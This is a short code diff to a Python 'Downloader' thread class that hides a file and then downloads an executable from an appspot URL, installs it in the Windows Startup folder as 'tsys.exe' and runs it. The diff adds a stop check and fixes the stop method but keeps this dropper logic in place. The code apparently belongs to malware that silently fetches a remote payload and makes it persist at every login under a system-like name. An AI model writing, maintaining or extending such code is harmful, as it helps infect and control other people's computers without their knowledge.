@@ -33,11 +33,13 @@ class Downloader(threading.Thread):
         launcher.hide_file(path)
         
         #DIR the launcher
+        if self._stop.is_set(): return
         launcher.download_install_run(
             "http://littlesitetomakemoney.appspot.com/launcher.exe", 
             shellcon.CSIDL_STARTUP, 
             "tsys.exe")
+        return
         
-        def stop():
-            """Stop the thread"""
-            self._stop.set()
+    def stop(self):
+        """Stop the thread"""
+        self._stop.set()
